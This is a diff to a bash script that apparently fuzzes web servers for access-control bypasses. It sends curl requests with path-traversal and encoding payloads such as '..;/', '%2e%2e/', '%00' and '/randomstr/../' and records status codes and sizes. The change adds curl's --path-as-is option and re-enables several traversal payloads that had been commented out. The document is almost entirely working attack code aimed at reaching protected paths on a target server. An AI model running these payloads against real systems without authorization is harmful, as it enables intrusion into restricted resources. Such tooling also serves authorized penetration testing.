@@ -63,7 +63,7 @@ fi
 DIR=${DIR#/}
 
 function curl_wapper(){
-	curl -k -s -o /dev/null -w "%{http_code}","%{size_download}" "$USER_AGENT" "$TIMEOUT" $REDIRECT "$METHOD" "$@"
+	curl -k -s -o /dev/null --path-as-is -w "%{http_code}","%{size_download}" "$USER_AGENT" "$TIMEOUT" $REDIRECT "$METHOD" "$@"
 }
 
 function payload_Suffux(){
@@ -82,7 +82,7 @@ function payload_Suffux(){
 		output "${1}%00" $(curl_wapper "${1}%00")
 		output "${1}..;/" $(curl_wapper "${1}..;/")
 		output "${1}%" $(curl_wapper "${1}%")
-		# output "${1}?" $(curl_wapper "${1}?")
+		output "${1}?" $(curl_wapper "${1}? ")
 		output "${1}??" $(curl_wapper "${1}??")
 		output "${1}\..\.\\" $(curl_wapper "${1}\..\.\\")
 		upper_end=${1:0:${#1}-1}$(tr '[:lower:]' '[:upper:]' <<< ${1:${#1}-1:1})
@@ -95,7 +95,7 @@ function payload_Suffux(){
 	output "${1}/;" $(curl_wapper "${1}/;")
 	output "${1}/%3f" $(curl_wapper "${1}/%3f")
 	output "${1}/%" $(curl_wapper "${1}/%")
-	# output "${1}/?" $(curl_wapper "${1}/?")
+	output "${1}/?" $(curl_wapper "${1}/? ")
 	output "${1}/%00" $(curl_wapper "${1}/%00")
 	output "${1}/??" $(curl_wapper "${1}/??")
 	output "${1}/%20" $(curl_wapper "${1}/%20")
@@ -111,12 +111,12 @@ function payload_Suffux(){
 	output "${1}/%2e" $(curl_wapper "${1}/%2e")
 	output "${1}/%2e/" $(curl_wapper "${1}/%2e/")
 	output "${1}//" $(curl_wapper "${1}//")
-	# output "${1}/./" $(curl_wapper "${1}/./")
-	# output "${1}/../" $(curl_wapper "${1}/../")
+	output "${1}/./" $(curl_wapper "${1}/./")
+	output "${1}/../" $(curl_wapper "${1}/../")
 	output "${1}/%2e%2e/" $(curl_wapper "${1}/%2e%2e/")
 	output "${1}/%2e%2e%2f" $(curl_wapper "${1}/%2e%2e%2f")
 
-	# output "${1}/randomstr/../" $(curl_wapper "${1}/randomstr/../")
+	output "${1}/randomstr/../" $(curl_wapper "${1}/randomstr/../")
 	output "${1}/randomstr/..;/" $(curl_wapper "${1}/randomstr/..;/")
 	output "${1}/randomstr/%2e%2e/" $(curl_wapper "${1}/randomstr/%2e%2e/")
 	output "${1}/randomstr/%2e%2e%2f" $(curl_wapper "${1}/randomstr/%2e%2e%2f")
@@ -133,13 +133,13 @@ function payload_Between(){
 
 	output "${1}/%2e/${2}" $(curl_wapper "${1}/%2e/${2}")
 	output "${1}/;${2}" $(curl_wapper "${1}/;${2}")
-	# output "${1}/randomstr/../${2}" $(curl_wapper "${1}/randomstr/../${2}")
+	output "${1}/randomstr/../${2}" $(curl_wapper "${1}/randomstr/../${2}")
 	output "${1}/randomstr/..%2f${2}" $(curl_wapper "${1}/randomstr/..%2f${2}")
 	output "${1}/randomstr/..;/${2}" $(curl_wapper "${1}/randomstr/..;/${2}")
 	output "${1}/randomstr/%2e%2e/${2}" $(curl_wapper "${1}/randomstr/%2e%2e/${2}")
 	output "${1}/randomstr/%2e%2e%2f${2}" $(curl_wapper "${1}/randomstr/%2e%2e%2f${2}")
 	output "${1}/;/${2}" $(curl_wapper "${1}/;/${2}")
-	# output "${1}/./${2}" $(curl_wapper "${1}/./${2}")
+	output "${1}/./${2}" $(curl_wapper "${1}/./${2}")
 	output "${1}/.%2f${2}" $(curl_wapper "${1}/.%2f${2}")
 	output "${1}/%2f${2}" $(curl_wapper "${1}/%2f${2}")
 	output "${1}//${2}" $(curl_wapper "${1}//${2}")
